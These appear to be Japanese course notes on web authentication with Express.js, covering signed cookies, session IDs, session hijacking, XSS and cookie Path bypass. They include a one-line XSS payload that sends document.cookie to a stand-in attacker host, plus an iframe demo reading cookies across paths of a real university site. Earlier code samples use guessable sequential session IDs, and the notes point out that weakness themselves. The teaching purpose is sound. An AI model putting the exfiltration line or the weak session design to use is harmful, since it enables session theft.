# やりたいこと
* 残高 BALANCEを表示する
* Logout機能をつくる

* 認証機構を作り込む

##
## BALANCEを表示する
* BALANCES のデータベースをつくる
* 画面表示にbalanceを表示する

```
const BALANCES ={
    alice: 500, bob: 100
}

app.get('/', (req, res) => {
    const balance  =BALANCES[username]
    if (username) {
        res.send(`Hi ${username}. Your balance is $${balance}.`)
    } else {
    createReadStream('index.html').pipe(res)
    }
})
```

## Logout機能をつくる
* '/logout'をGETするとクッキーを消す
```
app.get('/logout',(req, res)=>{
    res.clearCookie('username')
    res.redirect('/')
})
```

# 講義（認証機構、秘密鍵、タグ、サーバ間の通信）

## デジタル署名
* デジタル署名は、暗号アルゴリズムを利用した電子的な署名である。
* 電子メール メッセージ、マクロ、電子ドキュメントなどに付すことで、署名した本人のものであることと改ざんされていないことを証明できる。

## 鍵生成
鍵生成アルゴリズムをG、公開鍵と秘密鍵のペアを\$`(pk,sk)`\$とする。
署名アルゴリズムをS、入力をx、出力（タグ）tとする。
検証アルゴリズムV、出力は署名検証成功(accept)と拒否(reject)とする。
```math
\textrm{G}() \rightarrow (pk,sk) \\
\textrm{S}(sk,x) \rightarrow t \\
\textrm{V}(pk,x,t) \rightarrow \text{accept|reject}
```
このとき、Vはの性質を持つようにつくる。
```math
\textrm{V}(pk,x,S(sk,x)) \rightarrow \text{accept}
```
また、セキュリティ上の性質をもつ。攻撃者が$`x,t`$を選んでもrejectでなければならない。
```math
\textrm{V}(pk,x,t) \rightarrow \text{reject}

```

### クライアント・サーバ間の通信
クライアント・サーバ間の通信は、
* Step1: クライアントがサーバにusername/passwordを送信して認証
* Step2: サーバが入力値としてusernameを用いたtagを生成し、クライアントにSet-Cookieとしてusername/tagを送信する。
* Step3: クライアントはCookieにあるusername/tagを添えて、リクエストを送信する。
* Step4: サーバは受け取ったusername/tagをVを使って検証する。検証が成功したらレスポンスを返す。
* Step5: Step3にもどる。

# 認証機構を作り込む
* サーバで認証するのは一度
* その後はtagを使って認証する

## 認証の際にtagをつくる
* cookieParser()の変数はsecret, optionsであり、secretにCOOKIE_SECRETで署名用の秘密鍵を入れる。[cookie-parser](https://www.npmjs.com/package/cookie-parser)の説明を読む。
* req.signedCookies.username に変える。署名したため。
* 動作を確認すると、Cookiesをブラウザから見るとValueにusernameが組み込まれていて、tagが利用者の特定に利用されている。ただ、bobに変えても動かない。
```
const app = express()
app.use(cookieParser(COOKIE_SECRET))
app.use(bodyParser.urlencoded({ extended: false }))

app.get('/', (req, res) => {
    const username  = req.signedCookies.username
    const balance  =BALANCES[username]
    if (username) {
        res.send(`Hi ${username}. Your balance is $${balance}.`)

    } else {
    createReadStream('index.html').pipe(res)
    }
})
```

# ここまでの問題点
* Cookieのusernameにひもづく値を窃取されたときに、ログアウト後でもログインされてしまう
  * 解決策：サーバがtagを保持するデータベースをつくっておいて、ログアウト後にusernameに紐付くtagを消す。

## 解決策の実装
* `SESSIONS` テーブルを作ってtagを管理する。sessionIdはusernameと紐付ける。
* `sessionId`
  * /login のパスワード認証後にsessionIdを付与する
  * sessionIdは インクリメンタルにつくる。nextSessionIdで番号を管理する。
  * /logout でsessionIdを消す
  * / でsessionIdをつくり、usernameをSESSIONSから参照する
  * nextSessionIdに紐付くusernameを登録する

### サーバがログイン時にsessionIdをCookieに設定する。
```
let nextSessionId = 0 // nextSessionIdの変数宣言
// letを使うと変数を間違って再宣言してしまったときにエラーが出る。varは出ない。

app.post('/login', (req, res)=>{
...
    if (req.body.password === password){
        res.cookie('sessionId',nextSessionId) // cookieにsessionIdを作ってnextSessionIdをいれる。
        SESSIONS[nextSessionId] = username // nextSessionId:username をデータベースに登録する
        nextSessionId += 1 // 次のsessionIdをセットする。
        res.redirect('/')
    } else {
       ...
    }
})
```

### ログイン後にsessionIdを見て、BALANCESデータベースから残高を参照する。
```
app.get('/', (req, res) => {
    const sessionId = req.cookies.sessionId // クライアントのcookieのsessionIdを参照する。
    const username = SESSIONS[sessionId] // サーバのSESSIONS データベースからusernameをひいてくる。
    ...
    }
})
```

### logoutしたらsessionIdをSESSIONSデータベースから削除する

```
app.get('/logout',(req, res)=>{
    const sessionId = req.cookies.sessionId // sessionIdの特定
    res.clearCookie('username')
    delete SESSIONS[sessionId] // sessionIdの削除
    res.redirect('/')
})
```

# 問題点
* sessionIdがsequencialなので、攻撃者が容易に想像できる。
## 解決案
* IPアドレスに紐付くようにする
  * NATの場合、IPアドレスを共有するので不適切
  * モバイル環境の場合はIPアドレスが変わるので不適切
* 署名検証をつかう
* ランダムにsessionIdを割り当てる

## 実装
* ランダムにsessionIdを割り当てる
```
const { randomBytes } = require('crypto')
...
app.post('/login', (req, res)=>{
    if (req.body.password === password){
        nextSessionId = randomBytes(16).toString('base64')
        ...
```

# cookiesの歴史
* 1994年にNetscapeが実装、4ページの草案
* cookieの仕様は17年間無かった
  * 1997年に仕様策定の試みはあったが、互換性はない
  * 2000年に再び仕様策定を試みた(Cookie2)、やはり問題がある
  * 2011年頃にIETFがRFC6265として仕様を決めた
* Ad-hocな設計なので、興味深い問題を引き起こす

# Cookieの性質
* Expiers: 使用期限を定めることができる。定めない場合は、セッションがある限り継続する
* Path: Cookieヘッダーにおいてpathに基づく要求を実装できる
  * 例：Path=/docs は/docs, /docs/Web/などにマッチする
  * セキュリティに使ってはいけない
* Domain: Set-Cookie ヘッダよりも広いドメインに対して利用できるcookieを設定できる
  * login.shibaura-it.ac.jp は shibaura-it.ac.jpのドメインに対して設定できる。

# Cookieの有効期間は？
* Websiteは期限切れ（Expire）となる日時を決める事が出来る。これはとても長い期間でもよい。
  * 例：Googleは2007年にcookieの有効期限を「2038年まで」から「2年ごと」に短縮した。(Search Engine Land)
  * Expireを設定しない場合、ブラウザのセッションが続く限り有効となる。
    * ブラウザはセッションを復旧させるために、長く保持する場合がある。

# Cookieを削除する方法
* Cookieを同じ名前かつ同じ有効期限で設定する
* Cookieの値は省略可能
  * `Set-Cookie: key=; Expires=Thu, 01 Jan 1970 00:00:00 GMT'

# Session Hijacking
* HTTPでcookieを送信することは危険である。
  * 攻撃者が平文のcookieを読み取ることができれば、セッションをハイジャックできる。
  * 攻撃者は、攻撃対象から窃取したcookieを自分で正規に取得したように見せかけてサーバに送信できる。
  * その結果、サーバは攻撃者を正規のクライアントとみなしてしまう。

## Session Hijacking 対策
* `Secure`属性を付与して、暗号化されていないHTTP接続でCookieが送信されることを防ぐ  
  `Set-Cookie: key=value; Secure`
* より良い対策：HTTPSをWebサイト全体で利用する

# Cross Site Scripting (XXS) を用いたSession Hijacking
* XSS脆弱性があるWebサイトとは
  * 攻撃者がWebサイトに悪意のあるコードを埋め込む
  * この時点で攻撃者はWebサイト訪問者（クライアント）の訪問したWebサイトのcookieを抜き出すことが出来る  
    `new Image().src = 'https://attacker.com/steal?cookie=' + document.cookie`

# Protect cookikes from XSS
* HttpOnly属性を付与することで、Javascriptでcookieを読むことが出来なくなる。  
  * `Set-Cookie: key=value; Secure; HttpOnly`

# Cookieで設定したpathのバイパス
* CookieのPathをセキュリティ強化目的に使わない
  * Pathは同一のオリジンからの不正なcookieの読み込みをここでいう同一のオリジンとは`二つのページのプロトコル、ポート番号 (もしあれば)、ホストが等しい場合、両者のページは同じオリジンです。これは「スキーム/ホスト/ポート番号のタプル」または時に単に「タプル」として参照されます`(出所:[Mozilla.org](https://developer.mozilla.org/ja/docs/Web/Security/Same-origin_policy))

# Demo: シラバスへの攻撃
* 1つのシラバスで設定したCookieの`sessionId`が別のページのconsole.logから読める。

## 社会システム科学概論
* [社会システム科学概論](http://syllabus.sic.shibaura-it.ac.jp/syllabus/2022/sys/133026.html.ja)
* コンソールを開いて`sessionId`を設定する。
```
document.cookie = 'sessionId=1234; Path=/syllabus/2022/sys'
> 'sessionId=1234; Path=/syllabus/2022/sys'
```
![image](/uploads/b9ec101bc63b8da456d2d392e7dad4e0/image.png)
## データサイエンス応用
* [データサイエンス応用](http://syllabus.sic.shibaura-it.ac.jp/syllabus/2022/sys/132990.html.ja)
* iframeで別のウィンドウを読み込ませて、そこから社会システム科学概論で設定した`sessionId`の値を読み取る。
* 同一オリジン(HTTPS/同一ホスト/443)なので、不正なcookieの読み込みができる。

```
const iframe = document.createElement('iframe')
iframe.src = 'http://syllabus.sic.shibaura-it.ac.jp/syllabus/2022/sys/133026.html.ja'
'http://syllabus.sic.shibaura-it.ac.jp/syllabus/2022/sys/133026.html.ja'
document.body.append(iframe)
console.log(iframe.contentDocument.cookie)
> sessionId=1234; ...
```
![image](/uploads/d74d93d51dea48b319603d38d4fc2fd8/image.png)